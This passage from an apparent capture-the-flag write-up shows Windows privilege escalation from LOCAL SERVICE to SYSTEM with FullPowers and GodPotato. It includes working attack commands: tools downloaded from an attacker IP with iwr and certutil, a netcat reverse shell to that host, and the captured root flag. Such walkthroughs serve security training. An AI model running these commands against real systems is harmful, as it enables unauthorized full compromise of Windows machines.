PS C:\temp> powercat -c 127.0.0.1 -p 7002
0.1 -p 7002
Windows PowerShell
Copyright (C) 2013 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```

## Automation

> https://github.com/itm4n/FullPowers

```c
PS C:\temp> iwr 10.10.16.29/FullPowers.exe -o FullPowers.exe
```

```c
C:\temp>FullPowers.exe
[+] Started dummy thread with id 2560
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.4851]
(c) 2018 Microsoft Corporation. All rights reserved.
```

```c
C:\Windows\system32>whoami /all

USER INFORMATION
----------------

User Name                  SID     
========================== ========
nt authority\local service S-1-5-19


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                                                              Attributes                                        
====================================== ================ ================================================================================================ ==================================================
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                                                                                                       
Everyone                               Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                                                          Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-87-343222087-845000640-1675840783-1352364494-2876961185                                    Enabled by default, Enabled group, Group owner    
LOCAL                                  Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-3659434007-2290108278-1125199667-3679670526-1293081662-2164323352-1777701501-2595986263 Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-383293015-3350740429-1839969850-1819881064-1569454686-4198502490-78857879-1413643331    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-2035927579-283314533-3422103930-3587774809-765962649-3034203285-3544878962-607181067    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-11742800-2107441976-3443185924-4134956905-3840447964-3749968454-3843513199-670971053    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-3523901360-1745872541-794127107-675934034-1867954868-1951917511-1111796624-2052600462   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

> https://github.com/BeichenDream/GodPotato

```c
PS C:\temp> certutil -urlcache -split -f "http://10.10.16.29/GodPotato-NET4.exe" GodPotato-NET4.exe
****  Online  ****
  0000  ...
  e000
CertUtil: -URLCache command completed successfully.
```

```c
PS C:\temp> certutil -urlcache -split -f "http://10.10.16.29/nc64.exe" nc64.exe
****  Online  ****
  0000  ...
  b0d8
CertUtil: -URLCache command completed successfully.
```

```c
PS C:\temp> .\GodPotato-NET4.exe -cmd 'nc64.exe 10.10.16.29 9001 -e cmd.exe'
[*] CombaseModule: 0x140726602366976
[*] DispatchTable: 0x140726604673136
[*] UseProtseqFunction: 0x140726604049312
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\5f2bc9ea-44ac-481c-aa76-d214eb3de3e7\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00006402-0744-ffff-fdc1-3a669da3b931
[*] DCOM obj OXID: 0x4cb107cfb82e5d7d
[*] DCOM obj OID: 0x6612ad847b894c03
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 868 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1940
```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.29] from (UNKNOWN) [10.129.91.95] 49685
Microsoft Windows [Version 10.0.17763.4851]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\temp>whoami /all
whoami /all

USER INFORMATION
----------------

User Name           SID     
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                            Attributes                                        
====================================== ================ ============================================================== ==================================================
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                                                                     
Everyone                               Well-known group S-1-1-0                                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                       Mandatory group, Enabled by default, Enabled group
NT SERVICE\BrokerInfrastructure        Well-known group S-1-5-80-1988685059-1921232356-378231328-2704142597-890457928  Enabled by default, Enabled group, Group owner    
NT SERVICE\DcomLaunch                  Well-known group S-1-5-80-1601830629-990752416-3372939810-977361409-3075122917  Enabled by default, Enabled group, Group owner    
NT SERVICE\DeviceInstall               Well-known group S-1-5-80-2659457741-469498900-3203170401-3149177360-3048467625 Enabled by default, Group owner                   
NT SERVICE\LSM                         Well-known group S-1-5-80-1230977110-1477712667-2747199032-477530733-939374687  Enabled by default, Group owner                   
NT SERVICE\Power                       Well-known group S-1-5-80-2343416411-2961288913-598565901-392633850-2111459193  Enabled by default, Enabled group, Group owner    
NT SERVICE\SystemEventsBroker          Well-known group S-1-5-80-1662832393-3268938575-4001313665-1200257238-783911988 Enabled by default, Group owner                   
LOCAL                                  Well-known group S-1-2-0                                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                 Alias            S-1-5-32-544                                                   Enabled by default, Enabled group, Group owner    


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeAuditPrivilege                          Generate security audits                                           Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

## root.txt

```c
C:\Users\Administrator\Desktop>type root.txt
type root.txt
df47ed90fc39da762cd79a92954b5fe8
```
